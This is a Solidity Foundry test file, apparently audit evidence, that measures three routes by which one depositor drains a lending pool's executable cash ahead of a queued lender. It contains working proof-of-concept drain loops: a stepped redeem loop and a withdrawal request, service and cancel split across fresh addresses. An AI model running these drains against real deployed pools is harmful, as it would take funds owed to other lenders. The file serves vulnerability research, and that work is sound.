// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {LenderPool} from "../src/LenderPool.sol";
import {MockUSDC} from "./mocks/MockUSDC.sol";

/// @title Round 60, S1: the THREE routes to the queued lender's cash, measured on the same state.
/// @notice Issue #47 (H-03) has been argued as ONE route: the same controller servicing its own
///         request in steps. The auditor's request-draw memory closes that route. This file
///         measures the two others from the identical fixture, and the answer is that they drain
///         the same cash by the same recurrence, because the reserve is a FRACTION of live cash
///         rather than an amount of it, and every exit lowers the cash the fraction is taken of.
///
/// @dev Fixture: blocker deposits 10,000, attacker deposits 10,000, the manager lends 15,000, the
///      blocker queues everything and sits. Executable cash E = 5,000; supply S = 20,000; queued
///      q = 10,000; price 1. The reserve is `ceil(E * q / S)` and the sync door pays out of
///      `E - reserve`, so one `redeem` pays 2,500.000000.
///
///      The sync loop: with price 1 every `redeem` lowers E and S by the SAME amount, so after a
///      payout of U the reserve is `(E - U) * q / (S - U)`, which is smaller than `E * q / S`
///      whenever `q < S`. The unreserved remainder is `E (S - q) / S`, and with `S - q` fixed at
///      5,000 by the principal out, it is zero only when E is. The loop therefore reaches the
///      whole 5,000, and the request-draw memory cannot see it because no request was serviced.
///
///      The sequential address split: request all, service `maxRequestRedeem` once, cancel,
///      transfer the remainder to a FRESH address, repeat. Every fresh controller has no memory,
///      so each step is the shipped recurrence with the address changed. The auditor's split test
///      chunks the position in PARALLEL (each chunk requests its own slice of the same base), which
///      converts less as it gets finer; that is a different walk and not the one that drains.
///
///      Every figure logged as MEASURED was read from the run that pins it, on the shipped tree at
///      `68ac048` with forge 1.8.1, and the assertions hold the figures rather than the direction:
///      the stepped sync door 4,999.999998 over 53 calls (the request loop's own total and call
///      count, `R59A02_H03CounterCase`), the blocker left 1 wei serviceable; the 40-address
///      sequential split 4,999.999773 through EITHER door, the blocker left 151 wei; the parallel
///      40-chunk walk 4,867.321159 on the shipped tree (it is the request-draw memory that takes
///      the auditor's figure down to 2,064.515667, and it does nothing to the two walks above).
contract R60S1_H03Routes is Test {
    MockUSDC internal usdc;
    LenderPool internal pool;

    address internal admin = makeAddr("admin");
    address internal manager = makeAddr("creditManager");
    address internal harvester = makeAddr("harvester");

    address internal attacker = makeAddr("attacker");
    address internal blocker = makeAddr("blocker");

    uint256 internal constant ADDRESSES = 40;

    function setUp() public {
        usdc = new MockUSDC();
        pool = new LenderPool(IERC20(address(usdc)), admin);
        vm.startPrank(admin);
        pool.setCreditManager(manager);
        pool.setEpochHarvester(harvester);
        vm.stopPrank();
    }

    function _deposit(address who, uint256 amount) internal {
        usdc.mint(who, amount);
        vm.startPrank(who);
        usdc.approve(address(pool), type(uint256).max);
        pool.deposit(amount, who);
        vm.stopPrank();
    }

    function _lend(uint256 amount) internal {
        vm.prank(manager);
        pool.lend(amount);
    }

    /// @dev The #47 counter-case state: two lenders of 10,000, 15,000 lent, the blocker queued.
    function _counterCase() internal {
        _deposit(blocker, 10_000e6);
        _deposit(attacker, 10_000e6);
        _lend(15_000e6);
        uint256 blockerShares = pool.balanceOf(blocker);
        vm.prank(blocker);
        pool.requestWithdrawal(blockerShares, blocker);
        assertEq(pool.queueCashReserve(), 2_500e6, "fixture: the blocker's reserve is not 2,500");
    }

    function _blockerServiceable() internal view returns (uint256) {
        return pool.previewRedeem(pool.maxRequestRedeem(blocker));
    }

    function _sock(uint256 i) internal pure returns (address) {
        return address(uint160(0x60510000 + i));
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Route one: the sync door, stepped
    // ─────────────────────────────────────────────────────────────────────────

    /// @notice `redeem(maxRedeem)` in a loop reaches the same cash the stepped request loop does.
    ///         No request is serviced, so a request-draw memory of any shape is not consulted.
    function test_R60S1_H03_theSyncDoorSteppedDrainsTheSameCash() public {
        _counterCase();
        uint256 blockerBefore = _blockerServiceable();

        uint256 total;
        uint256 calls;
        uint256 first;
        for (uint256 i = 0; i < 128; i++) {
            uint256 shares = pool.maxRedeem(attacker);
            if (shares == 0) break;
            vm.prank(attacker);
            uint256 paid = pool.redeem(shares, attacker, attacker);
            if (calls == 0) first = paid;
            total += paid;
            ++calls;
        }

        console2.log("MEASURED sync door, first redeem paid      ", first);
        console2.log("MEASURED sync door, stepped, total paid    ", total);
        console2.log("MEASURED sync door, stepped, calls         ", calls);
        console2.log("MEASURED attacker shares left              ", pool.balanceOf(attacker));
        console2.log("MEASURED blocker serviceable before        ", blockerBefore);
        console2.log("MEASURED blocker serviceable after         ", _blockerServiceable());
        console2.log("MEASURED queueCashReserve after            ", pool.queueCashReserve());

        assertEq(first, 2_500e6, "one redeem pays other than the sync door's 2,500");
        assertEq(total, 4_999_999_998, "the stepped sync door reached other than 4,999.999998");
        assertEq(calls, 53, "the stepped sync door took other than 53 calls");
        assertEq(blockerBefore, 2_500e6, "the blocker's serviceable figure did not open at 2,500");
        assertEq(_blockerServiceable(), 1, "the blocker was left other than one wei serviceable");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Route two: the request door, one fresh controller per step
    // ─────────────────────────────────────────────────────────────────────────

    /// @notice Request all, service once, cancel, move the remainder to a fresh address, repeat.
    ///         Each controller draws exactly one slice, so a per-controller memory never binds.
    function test_R60S1_H03_theSequentialAddressSplitThroughTheRequestDoor() public {
        _counterCase();
        uint256 blockerBefore = _blockerServiceable();

        uint256 total;
        uint256 steps;
        address holder = attacker;
        for (uint256 i = 0; i < ADDRESSES; i++) {
            uint256 shares = pool.balanceOf(holder);
            if (shares == 0) break;
            vm.startPrank(holder);
            pool.requestWithdrawal(shares, holder);
            uint256 serviceable = pool.maxRequestRedeem(holder);
            if (serviceable != 0) {
                total += pool.serviceWithdrawalRequest(holder, serviceable, 0);
                ++steps;
            }
            (,, uint256 remaining,,) = pool.withdrawalRequest(holder);
            if (remaining != 0) pool.cancelWithdrawalRequest();
            uint256 left = pool.balanceOf(holder);
            address next = _sock(i);
            if (left != 0) pool.transfer(next, left);
            vm.stopPrank();
            holder = next;
            if (serviceable == 0) break;
        }

        console2.log("MEASURED request door, address split, total", total);
        console2.log("MEASURED request door, address split, steps", steps);
        console2.log("MEASURED shares left on the last address   ", pool.balanceOf(holder));
        console2.log("MEASURED blocker serviceable before        ", blockerBefore);
        console2.log("MEASURED blocker serviceable after         ", _blockerServiceable());

        assertEq(total, 4_999_999_773, "the sequential split reached other than 4,999.999773");
        assertEq(steps, 40, "the sequential split paid on other than every address");
        assertEq(_blockerServiceable(), 151, "the blocker was left other than 151 wei serviceable");
    }

    /// @notice The same sequential split through the sync door: redeem the maximum once, move
    ///         the remainder to a fresh address, repeat. Identical to the loop above the fold,
    ///         with the address changed; kept so the record says both doors were walked this way.
    function test_R60S1_H03_theSequentialAddressSplitThroughTheSyncDoor() public {
        _counterCase();

        uint256 total;
        uint256 steps;
        address holder = attacker;
        for (uint256 i = 0; i < ADDRESSES; i++) {
            uint256 shares = pool.maxRedeem(holder);
            if (shares == 0) break;
            vm.startPrank(holder);
            total += pool.redeem(shares, holder, holder);
            ++steps;
            uint256 left = pool.balanceOf(holder);
            address next = _sock(i);
            if (left != 0) pool.transfer(next, left);
            vm.stopPrank();
            holder = next;
        }

        console2.log("MEASURED sync door, address split, total   ", total);
        console2.log("MEASURED sync door, address split, steps   ", steps);
        console2.log("MEASURED blocker serviceable after         ", _blockerServiceable());

        assertEq(total, 4_999_999_773, "the split sync walk reached other than 4,999.999773");
        assertEq(steps, 40, "the split sync walk took other than 40 steps");
        assertEq(_blockerServiceable(), 151, "the blocker was left other than 151 wei serviceable");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // The auditor's split, for the record: PARALLEL chunks are a different walk
    // ─────────────────────────────────────────────────────────────────────────

    /// @notice Forty equal chunks, each requesting and servicing its own slice. This is the walk
    ///         the auditor measured at 2,064.515667 over 40 addresses and it converts LESS as it
    ///         gets finer, because each chunk's slice is `E * chunk / S` of a base the earlier
    ///         chunks drained and the remainder of every chunk is stranded. It is not the route.
    function test_R60S1_H03_parallelChunksAreNotTheRoute() public {
        _counterCase();

        uint256 attackerShares = pool.balanceOf(attacker);
        uint256 chunk = attackerShares / ADDRESSES;
        uint256 total;
        for (uint256 i = 0; i < ADDRESSES; i++) {
            address sock = _sock(i);
            vm.prank(attacker);
            pool.transfer(sock, chunk);
            vm.startPrank(sock);
            pool.requestWithdrawal(chunk, sock);
            for (uint256 j = 0; j < 8; j++) {
                uint256 serviceable = pool.maxRequestRedeem(sock);
                if (serviceable == 0) break;
                total += pool.serviceWithdrawalRequest(sock, serviceable, 0);
            }
            vm.stopPrank();
        }

        console2.log("MEASURED parallel chunks, 40, total        ", total);
        console2.log("MEASURED blocker serviceable after         ", _blockerServiceable());
        assertLt(total, 4_999_999_998, "parallel chunking reached the sequential figure");
    }
}
